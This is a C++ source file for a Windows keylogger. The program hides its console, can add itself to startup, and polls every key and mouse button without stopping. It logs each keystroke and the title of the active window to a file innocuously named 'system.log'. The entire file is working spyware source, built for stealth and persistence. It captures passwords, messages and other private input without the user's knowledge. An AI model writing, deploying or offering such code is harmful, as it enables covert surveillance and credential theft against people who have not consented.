/*
	Keylogger
*/

#include "main.h"

using namespace std;

int main(int argc, char *argv[]) {
	if(INVISIBLE == 1) {
		FreeConsole();
	}
	if (RUN_AT_STARTUP == 1) {

		registerProgram();
	}

	bool capsLock = isCapsLock(); // If the low-order bit is 1, the key is toggled

	string basepath = dirBasename(getSelfPath());

	time_t rawtime;
	struct tm timeinfo;
	time(&rawtime);
	localtime_s(&timeinfo, &rawtime);
	char filename[MAX_PATH];
	char filepath[MAX_PATH];
	strftime(filename, 100, "system.log", &timeinfo);
	sprintf_s(filepath, "%s\\%s%s", basepath.c_str(), filename, FILEEXT);

	string lastTitle = "";
	ofstream outFile(filepath);

	while (1) {
		Sleep(3);  // TODO Is there a better way than using while(1)?
		// get the active window title
		char title[1024];
		HWND hwndHandle = GetForegroundWindow();
		GetWindowText(hwndHandle, title, 1023);
		if (lastTitle != title) {
			logFile(outFile, "\n\nWindow");
			logFile(outFile, strlen(title) == 0 ? "No Active Window" : title);
			logFile(outFile, "\n");
			lastTitle = title;
		}

		// Logging keys
		for (unsigned char c = 1; c < 255; c++) {
			SHORT rv = GetAsyncKeyState(c);
			if (rv & 0x0001) { // on button pressed  down
				string out = "";
				switch (c) {
				case 0x01:
					out = "[LMOUSE]";
					break;
				case 0x02:
					out = "[RMOUSE]";
					break;
				case 0x03:
					out = "[CONTROL_BREAK]";
					break;
				case 0x04:
					out = "[MMOUSE]";
					break;
				case 0x05:
					out = "[X1_M_BUTTON]";
					break;
				case 0x06:
					out = "[X2_M_BUTTON]";
					break;
				case 0x08:
					out = "[BACKSPACE]";
					break;
				case 0x09:
					out = "[TAB]";
					break;
				case 0x0C:
					out = "[CLEAR]";
					break;
				case 0x0D:
					out = "[ENTER]\n";
					break;
				case 0x10:
					out = "[SHIFT]";
					break;
				case 0x11:
					out = "[CTRL]";
					break;
				case 0x12:
					out = "[ALT]";
					break;
				case 0x13:
					out = "[PAUSE]";
					break;
				case 0x14:
					out = "[CAPS LOCK]";
					break;
				case 0x15:
					out = "[IME Kana]";
					break;
				case 0x17:
					out = "[IME Junja]";
					break;
				case 0x18:
					out = "[IME final]";
					break;
				case 0x19:
					out = "[IME Hanja]";
					break;
				case 0x1B:
					out = "[ESC]";
					break;
				case 0x1C:
					out = "[IME CONVERT]";
					break;
				case 0x1D:
					out = "[IME nonconvert]";
					break;
				case 0x1E:
					out = "[IME accept]";
					break;
				case 0x1F:
					out = "[IME mode change request]";
					break;
				case 0x20:
					out = " ";
					break;
				case 0x21:
					out = "[PAGE UP]";
					break;
				case 0x22:
					out = "[PAGE DOWN]";
					break;
				case 0x23:
					out = "[END]";
					break;
				case 0x24:
					out = "[HOME]";
					break;
				case 0x25:
					out = "[LEFT ARROW]";
					break;
				case 0x26:
					out = "[UP ARROW]";
					break;
				case 0x27:
					out = "[RIGHT ARROW]";
					break;
				case 0x28:
					out = "[DOWN ARROW]";
					break;
				case 0x29:
					out = "[SELECT]";
					break;
				case 0x2A:
					out = "[PRINT]";
					break;
				case 0x2B:
					out = "[EXECUTE]";
					break;
				case 0x2C:
					out = "[PRINT SCREEN]";
					break;
				case 0x2D:
					out = "[INS]";
					break;
				case 0x2E:
					out = "[DEL]";
					break;
				case 0x2F:
					out = "[HELP]";
					break;
				case 0x30:  // 0-9	
				case 0x31:
				case 0x32:
				case 0x33:
				case 0x34:
				case 0x35:
				case 0x36:
				case 0x37:
				case 0x38:
				case 0x39:
					if (isShift()) {
						switch (c) {
						case 0x30:
							out = ")";
							break;
						case 0x31:
							out = "!";
							break;
						case 0x32:
							out = "@";
							break;
						case 0x33:
							out = "#";
							break;
						case 0x34:
							out = "$";
							break;
						case 0x35:
							out = "%";
							break;
						case 0x36:
							out = "^";
							break;
						case 0x37:
							out = "&";
							break;
						case 0x38:
							out = "*";
							break;
						case 0x39:
							out = "(";
							break;
						}
					}
					else {
						out = c;
					}
					break;
				case 0x41:   // A - Z
				case 0x42:
				case 0x43:
				case 0x44:
				case 0x45:
				case 0x46:
				case 0x47:
				case 0x48:
				case 0x49:
				case 0x4A:
				case 0x4B:
				case 0x4C:
				case 0x4D:
				case 0x4E:
				case 0x4F:
				case 0x50:
				case 0x51:
				case 0x52:
				case 0x53:
				case 0x54:
				case 0x55:
				case 0x56:
				case 0x57:
				case 0x58:
				case 0x59:
				case 0x5A:
					if (!(isShift() ^ isCapsLock())) { // Check if letters should be lowercase
						c += 32;
					}
					out = c;
					break;
				case 0x5B:
					out = "Left Windows";
					break;
				case 0x5C:
					out = "Right Windows";
					break;
				case 0x5D:
					out = "Applications";
					break;
				case 0x5F:
					out = "Computer Sleep";
					break;
				case 0x60:
				case 0x61:
				case 0x62:
				case 0x63:
				case 0x64:
				case 0x65:
				case 0x66:
				case 0x67:
				case 0x68:
				case 0x69:
					out = "" + intToString(c - 0x60);
					break;
				case 0x6A:
					out = "*";
					break;
				case 0x6B:
					out = "+";
					break;
				case 0x6C:
					out = "*";
					break;
				case 0x6D:
					out = "-";
					break;
				case 0x6E:
					out = ".";
					break;
				case 0x6F:
					out = "/";
					break;
				case 0x70:
				case 0x71:
				case 0x72:
				case 0x73:
				case 0x74:
				case 0x75:
				case 0x76:
				case 0x77:
				case 0x78:
				case 0x79:
				case 0x7A:
				case 0x7B:
				case 0x7C:
				case 0x7D:
				case 0x7E:
				case 0x7F:
				case 0x80:
				case 0x81:
				case 0x82:
				case 0x83:
				case 0x84:
				case 0x85:
				case 0x86:
				case 0x87:
					out = "[F" + intToString(c - 0X6F) + "]";
					break;
				case 0x90:
					out = "[NUM LOCK]";
					break;
				case 0x91:
					out = "[SCROLL LOCK]";
					break;
				case 0xA0:
					out = "[Left SHIFT]";
					break;
				case 0xA1:
					out = "[Right SHIFT]";
					break;
				case 0xA2:
					out = "[Left CONTROL]";
					break;
				case 0xA3:
					out = "[Right CONTROL]";
					break;
				case 0xA4:
					out = "[Left MENU]";
					break;
				case 0xA5:
					out = "[Right MENU]";
					break;
				case 0xA6:
					out = "[Browser Back]";
					break;
				case 0xA7:
					out = "[Browser Forward]";
					break;
				case 0xA8:
					out = "[Browser Refresh]";
					break;
				case 0xA9:
					out = "[Browser Stop]";
					break;
				case 0xAA:
					out = "[Browser Search]";
					break;
				case 0xAB:
					out = "[Browser Favorites]";
					break;
				case 0xAC:
					out = "[Browser Start and Home]";
					break;
				case 0xAD:
					out = "[Volume Mute]";
					break;
				case 0xAE:
					out = "[Volume Down]";
					break;
				case 0xAF:
					out = "[Volume Up]";
					break;
				case 0xB0:
					out = "[Next Track]";
					break;
				case 0xB1:
					out = "[Previous Track]";
					break;
				case 0xB2:
					out = "[Stop Media]";
					break;
				case 0xB3:
					out = "[Play/Pause Media]";
					break;
				case 0xB4:
					out = "[Start Mail]";
					break;
				case 0xB5:
					out = "[Select Media]";
					break;
				case 0xB6:
					out = "[Start Application 1]";
					break;
				case 0xB7:
					out = "[Start Application 2]";
					break;
				case 0xBA:
				case 0xBB:
				case 0xBC:
				case 0xBD:
				case 0xBE:
				case 0xBF:
				case 0xC0:
					if (isShift()) {
						switch (c) {
						case VK_OEM_1: 
							out = ":";
							break;
						case VK_OEM_PLUS: 
							out = "+";
							break;
						case VK_OEM_COMMA:
							out = "<";
							break;
						case VK_OEM_MINUS:
							out = "_";
							break;
						case VK_OEM_PERIOD:
							out = ">";
							break;
						case VK_OEM_2:
							out = "?";
							break;
						case VK_OEM_3:
							out = "~";
							break;
						}
					}
					else {
						switch (c) {
						case VK_OEM_1: 
							out = ";";
							break;
						case VK_OEM_PLUS: 
							out = "=";
							break;
						case VK_OEM_COMMA:
							out = ",";
							break;
						case VK_OEM_MINUS:
							out = "-";
							break;
						case VK_OEM_PERIOD:
							out = ".";
							break;
						case VK_OEM_2:
							out = "/";
							break;
						case VK_OEM_3:
							out = "`";
							break;
						}
					}
					break;
				case 0xDB:
				case 0xDC:
				case 0xDD:
				case 0xDE:
					if (isShift()) {
						switch (c) {
						case VK_OEM_4:
							out = "{";
							break;
						case VK_OEM_5:
							out = "|";
							break;
						case VK_OEM_6:
							out = "}";
							break;
						case VK_OEM_7:
							out = "\"";
							break;
						}
					}
					else {
						switch (c) {
						case VK_OEM_4:
							out = "[";
							break;
						case VK_OEM_5:
							out = "\\";
							break;
						case VK_OEM_6:
							out = "]";
							break;
						case VK_OEM_7:
							out = "'";
							break;
						}
					}
					break;
				case 0xE5:
					out = "[IME PROCESS]";
					break;
				case 0xF6:
					out = "[Attn]";
					break;
				case 0xF7:
					out = "[CrSel]";
					break;
				case 0xF8:
					out = "[ExSel]";
					break;
				case 0xF9:
					out = "[Erase EOF]";
					break;
				case 0xFA:
					out = "[Play]";
					break;
				case 0xFB:
					out = "[Zoom]";
					break;
				case 0xFD:
					out = "[PA1]";
					break;
				case 0xFE:
					out = "[Clear]";
					break;
				default: 
					out = "[KEY \\" + intToString(c) + "]";
					break;
				};
#ifdef DEBUG
				cout << "[" << out << "] (" << (unsigned)c << ")" << endl;
#endif
				outFile << out;
				outFile.flush();
			}
		}
	}

	outFile.close();

	return 0;
}
